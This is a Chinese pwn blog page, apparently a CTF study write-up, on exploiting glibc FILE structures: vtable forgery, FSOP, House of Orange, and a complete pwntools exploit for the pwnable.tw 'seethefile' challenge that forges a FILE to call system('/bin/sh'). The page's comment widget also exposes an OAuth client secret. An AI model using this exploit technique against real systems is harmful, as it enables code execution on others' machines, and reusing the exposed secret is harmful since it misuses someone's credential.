@@ -1,0 +1,274 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>FILE Exploration - Humoooor&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Humoooor&#039;s Blog"><meta name="msapplication-TileImage" content="/img/MyLogo.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Humoooor&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="系统地学一下 glibc 文件结构的洞"><meta property="og:type" content="blog"><meta property="og:title" content="FILE Exploration"><meta property="og:url" content="https://humoooor.cn/2022/10/11/FILE%20Exploration/"><meta property="og:site_name" content="Humoooor&#039;s Blog"><meta property="og:description" content="系统地学一下 glibc 文件结构的洞"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://humoooor.cn/img/og_image.png"><meta property="article:published_time" content="2022-10-11T03:15:00.000Z"><meta property="article:modified_time" content="2023-03-31T08:10:16.338Z"><meta property="article:author" content="Humoooor"><meta property="article:tag" content="Pwn"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://humoooor.cn/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://humoooor.cn/2022/10/11/FILE%20Exploration/"},"headline":"FILE Exploration","image":["https://humoooor.cn/img/og_image.png"],"datePublished":"2022-10-11T03:15:00.000Z","dateModified":"2023-03-31T08:10:16.338Z","author":{"@type":"Person","name":"Humoooor"},"publisher":{"@type":"Organization","name":"Humoooor's Blog","logo":{"@type":"ImageObject","url":"https://humoooor.cn/img/MyLogo.jpg"}},"description":"系统地学一下 glibc 文件结构的洞"}</script><link rel="canonical" href="https://humoooor.cn/2022/10/11/FILE%20Exploration/"><link rel="icon" href="/img/MyLogo.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Humoooor's Blog" type="application/atom+xml">
+</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/MyLogo.jpg" alt="Humoooor&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friends">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/humoooor"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-10-11T03:15:00.000Z" title="2022/10/11 11:15:00">2022-10-11</time>发表</span><span class="level-item"><time dateTime="2023-03-31T08:10:16.338Z" title="2023/3/31 16:10:16">2023-03-31</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Exploration/">Exploration</a></span><span class="level-item">8 分钟读完 (大约1240个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">FILE Exploration</h1><div class="content"><p>系统地学一下 glibc 文件结构的洞</p>
+<span id="more"></span>
+
+<h2 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h2><figure class="highlight c"><figcaption><span>./libio/libio.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>_IO_FILE<ul>
+<li>_flags<ul>
+<li>记录文件流的属性<ul>
+<li>Read only</li>
+<li>Append</li>
+<li>…</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Stream buffer<ul>
+<li>Read buffer<ul>
+<li>_IO_read_ptr</li>
+<li>_IO_read_end</li>
+<li>_IO_read_base</li>
+</ul>
+</li>
+<li>Write buffer<ul>
+<li>_IO_write_ptr</li>
+<li>_IO_write_end</li>
+<li>_IO_write_base</li>
+</ul>
+</li>
+<li>Reserve buffer<ul>
+<li>_IO_buf_base</li>
+<li>_IO_buf_end</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>_fileno<ul>
+<li>文件描述符</li>
+</ul>
+</li>
+<li>_chain<ul>
+<li>FILE 结构体是一个尾插法单向链表，默认有 stderr -&gt; stdout -&gt; stdin</li>
+</ul>
+</li>
+<li>_lock<ul>
+<li>避免多线程的条件竞争</li>
+<li>在攻击时通常需要构造它<ul>
+<li>使其指向一个全是0的空间</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>_IO_FILE_plus<ul>
+<li>stdin/stdout/stderr/fopen 使用这个结构体</li>
+<li>_IO_FILE</li>
+<li>vtable<ul>
+<li>所有对文件的操作都是通过 vtable</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="fopen-流程"><a href="#fopen-流程" class="headerlink" title="fopen 流程"></a>fopen 流程</h2><ol>
+<li>分配 FILE 结构体空间<ul>
+<li>malloc</li>
+</ul>
+</li>
+<li>初始化 FILE 结构体<ul>
+<li>_IO_new_file_init_internal</li>
+</ul>
+</li>
+<li>把 FILE 结构体放入链表<ul>
+<li>_IO_link_in</li>
+</ul>
+</li>
+<li>打开文件<ul>
+<li>_IO_new_file_open</li>
+<li>sys_open</li>
+</ul>
+</li>
+</ol>
+<h2 id="fread-流程"><a href="#fread-流程" class="headerlink" title="fread 流程"></a>fread 流程</h2><ol>
+<li>如果 stream buffer 是空的<ul>
+<li>vtable -&gt; _IO_file_xsgetn</li>
+<li>分配 buffer<ul>
+<li>vtable -&gt; _IO_file_doallocate</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>读取数据到 stream buffer 中<ul>
+<li>vtable -&gt; _IO_file_underflow</li>
+</ul>
+</li>
+<li>把数据从 stream buffer 复制到目的地址<ul>
+<li>sys_read</li>
+</ul>
+</li>
+</ol>
+<h2 id="fwrite-流程"><a href="#fwrite-流程" class="headerlink" title="fwrite 流程"></a>fwrite 流程</h2><ol>
+<li>如果 steam buffer 是空的<ul>
+<li>vtable -&gt; _IO_file_xsputn</li>
+<li>分配 buffer<ul>
+<li>vtable -&gt; _IO_file_doallocate</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>复制用户数据到 stream buffer</li>
+<li>如果 stream buffer 满了或者要刷新 steam buffer，将 steam buffer 的数据写入文件<ul>
+<li>sys_write</li>
+</ul>
+</li>
+</ol>
+<h2 id="fclose-流程"><a href="#fclose-流程" class="headerlink" title="fclose 流程"></a>fclose 流程</h2><ol>
+<li>把 FILE 结构从链表中移除<ul>
+<li>_IO_unlink_it</li>
+</ul>
+</li>
+<li>刷新并释放 stream buffer<ul>
+<li>_IO_new_file_close_it</li>
+<li>_IO_do_flush</li>
+</ul>
+</li>
+<li>关闭文件<ul>
+<li>sys_close</li>
+</ul>
+</li>
+<li>释放 FILE 结构<ul>
+<li>vtable -&gt; _IO_file_finish</li>
+<li>free</li>
+</ul>
+</li>
+</ol>
+<h2 id="伪造-vtable"><a href="#伪造-vtable" class="headerlink" title="伪造 vtable"></a>伪造 vtable</h2><p>伪造 FILE 结构，将 vtable 指向构造的函数</p>
+<ol>
+<li>修改 _lock 指向一个全为 0 的内存</li>
+<li>找到 vtable 的偏移</li>
+<li>修改 vtable 指向可控的内存</li>
+<li>调试查看 close 时会 call 的位置和 rdi 参数</li>
+<li>将对应位置改成 system 和 /bin/sh</li>
+</ol>
+<p>注：一般 rdi 的值为 _flags + 后面四个字节，所以一般前 8 个字节设置为 <code>AAAA;sh;</code></p>
+<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>File-Stream Oriented Programming</p>
+<ul>
+<li><p>控制文件结构链表</p>
+<ul>
+<li>_chain</li>
+<li>_IO_list_all 全局变量，链表头</li>
+</ul>
+</li>
+<li><p>IO_flush_all_lockp</p>
+<ul>
+<li>用于刷新所有 FILE 的缓存</li>
+<li>调用条件<ul>
+<li>当 libc 执行 abort 时</li>
+<li>当执行 exit 时</li>
+<li>当从 main 返回时</li>
+</ul>
+</li>
+<li>在调用时，如果 <code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 会调用 <code>vtable-&gt;_IO_overflow</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><ul>
+<li>利用 Unsorted bin attack 把 unsorted bin 写到 _IO_list_all</li>
+<li>构造 0x60 大小的 chunk 放入 small bin</li>
+<li>调用 _IO_flush_all_lockp 有 50% 概率把 0x60 大小的 chunk 作为 FILE 结构造成 FSOP</li>
+</ul>
+<h2 id="Pwnable-seethefile"><a href="#Pwnable-seethefile" class="headerlink" title="Pwnable seethefile"></a>Pwnable seethefile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure>
+
+<p>利用点</p>
+<ul>
+<li>读取 <code>/proc/self/maps</code> 得到 libc 地址</li>
+<li>在 <code>case 5</code> 的时候 name 溢出覆盖 fp 到 fake_file，<code>fclose(fp)</code>时就可以使用伪造的 vtable</li>
+</ul>
+<p>主要需要调试找到 _lock、vtable 和调用 vtable 中的函数的偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;chall.pwnable.tw:10200&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">p = remote(address[<span class="number">0</span>], address[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># p = process(__file__[0:-3])</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fopen</span>(<span class="params">filename</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fread</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fwrite</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln_exit</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">addr_fake_file = elf.sym[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">addr_fp = elf.sym[<span class="string">&quot;fp&quot;</span>]</span><br><span class="line">offset_fp = addr_fp - addr_fake_file</span><br><span class="line">offset_lock = <span class="number">0x48</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_vtable = <span class="number">0x94</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_call = <span class="number">0x44</span> <span class="comment"># addr_vtable + _</span></span><br><span class="line"></span><br><span class="line">fopen(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line"><span class="comment"># addr_libc = int(p.recv(8), 16)</span></span><br><span class="line">addr_libc = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) + <span class="number">0x1000</span></span><br><span class="line"><span class="comment"># info(&quot;libc addr =&gt; &quot; + hex(addr_libc))</span></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p32(addr_system) * <span class="number">6</span></span><br><span class="line">payload = (fake_file).ljust(offset_fp, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file)</span><br><span class="line">payload = (payload).ljust(offset_lock, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + offset_vtable + <span class="number">4</span>)</span><br><span class="line">payload = (payload).ljust(offset_vtable, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + <span class="number">8</span> - offset_call)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x8048b0f&quot;)</span></span><br><span class="line"></span><br><span class="line">vuln_exit(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><div class="article-licensing box"><div class="licensing-title"><p>FILE Exploration</p><p><a href="https://humoooor.cn/2022/10/11/FILE Exploration/">https://humoooor.cn/2022/10/11/FILE Exploration/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Humoooor</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-10-11</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-03-31</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Pwn/">Pwn</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/10/11/Musl%20libc%20Exploration/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Musl libc Exploration</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"><span class="level-item">Musl heap 浅析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
+            id: "bc10fbe8e07b9e09ff5dd41b7ea6a8de",
+            repo: "humoooor.github.io",
+            owner: "Humoooor",
+            clientID: "2262fbb1802e5dc5cc56",
+            clientSecret: "55e61f8ed70fa2bcec90cf254ac1864f21cb350b",
+            admin: ["Humoooor"],
+            createIssueManually: false,
+            distractionFreeMode: false,
+            perPage: 10,
+            pagerDirection: "last",
+            
+            
+            enableHotKey: true,
+            
+        })
+        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/MyLogo.jpg" alt="Humoooor"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Humoooor</p><p class="is-size-6 is-block">Free to Hack</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">2</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/humoooor" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/humoooor"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:humoooor@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-12T01:25:00.000Z">2022-11-12</time></p><p class="title"><a href="/2022/11/12/Lab5_Copy_on_write_fork/">Lab5 Copy-on-write fork</a></p><p class="categories"><a href="/categories/Course/">Course</a> / <a href="/categories/Course/MIT-6-1810-2022Fall/">MIT 6.1810 2022Fall</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T03:47:00.000Z">2022-10-31</time></p><p class="title"><a href="/2022/10/31/Lab4_Traps/">Lab4 Traps</a></p><p class="categories"><a href="/categories/Course/">Course</a> / <a href="/categories/Course/MIT-6-1810-2022Fall/">MIT 6.1810 2022Fall</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time 